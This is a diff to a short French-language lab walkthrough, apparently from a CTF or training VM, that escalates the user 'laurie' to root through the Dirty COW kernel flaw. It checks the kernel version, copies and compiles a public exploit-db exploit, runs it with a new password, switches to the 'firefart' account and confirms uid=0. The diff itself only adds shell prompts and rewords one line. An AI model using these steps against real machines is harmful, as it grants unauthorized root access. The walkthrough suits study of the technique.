@@ -2,14 +2,14 @@
 
 On se connecte en ssh a la machine avec les credentials:
 ```
-ssh laurie@<IP>
+$ ssh laurie@<IP>
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
 
 # Version KERNEL
 On verifie la version du Kernel
 ```
-uname -a
+$ uname -a
 ```
 
 On se rend compte que la version de Kernel (3.2.0-91) est vulnerable a la faille Dirty COW.
@@ -22,24 +22,24 @@ https://www.exploit-db.com/exploits/40839
 # Exploit
 On copie le fichier ```exploit_dirty.c``` dans la VM.
 ```
-scp exploit_dirty.c laurie@<IP>:/home/laurie 
+$ scp exploit_dirty.c laurie@<IP>:/home/laurie 
 ```
 
 On compile
 ```
-gcc -pthread exploit_dirty.c -o dirty -lcrypt
+$ gcc -pthread exploit_dirty.c -o dirty -lcrypt
 ```
 
 On execute
 ```
-./dirty <NEW-PASSWORD>
+$ ./dirty <NEW-PASSWORD>
 ```
 
-On execute ```su firefart``` avec le <NEW-PASSWORD> choisi.
+On execute ```su firefart``` avec le mot de passe choisi.
 
 On verifie l'uid
 ```
-id
+$ id
 ```
 
 On se rend compte que nous sommes uid=0. BINGO!!!
